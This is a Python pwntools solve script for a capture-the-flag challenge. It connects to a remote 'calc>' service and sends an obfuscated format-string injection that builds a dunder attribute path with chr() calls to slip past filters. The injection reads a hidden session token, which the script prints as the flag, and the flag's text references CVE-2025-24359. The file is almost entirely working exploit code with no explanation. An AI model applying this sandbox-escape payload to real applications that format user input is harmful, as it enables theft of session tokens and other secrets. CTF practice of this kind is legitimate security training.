from pwn import *

HOST, PORT = "chal.thjcc.org", 9006

# __fstring__
U = "chr(95)*2+'fstring'+chr(95)*2"
# .sheets['audit'].owner.session.token.value
PATH = "'.sheets'+chr(91)+'audit'+chr(93)+'.owner.session.token.value'"

PAYLOAD = [
    f"p = '}}{{'+{U}+{PATH}",
    'f"{WB:{p}}"'
]

def main():
    io = remote(HOST, PORT, timeout=10)

    io.recvuntil(b"calc> ")

    for line in PAYLOAD:
        io.sendline(line.encode())
        resp = io.recvuntil(b"calc> ")

    token = resp.decode().split("})")[-1].split("calc>")[0].strip()
    print(token) # THJCC{CVE_2025_24359_th3_p4tch_w4s_1nc0mpl3t3:/}

    io.close()

if __name__ == "__main__":
    main()